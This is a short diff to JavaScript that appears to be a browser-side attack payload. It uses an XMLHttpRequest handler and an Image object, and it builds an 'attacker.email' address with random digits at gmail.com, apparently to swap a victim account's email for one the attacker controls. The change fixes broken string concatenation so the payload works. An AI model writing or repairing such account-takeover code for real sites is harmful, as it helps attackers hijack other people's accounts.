@@ -30,7 +30,7 @@ xhr.onreadystatechange = function () {
             return Math.floor(Math.random() * 9000) + 1000;
             }
 
-            const newemail = "attacker.email"randomFourDigit()"@gmail.com";
+            const newemail = "attacker.email"+randomFourDigit()+"@gmail.com";
             const img = new Image();
 
 function finish() {
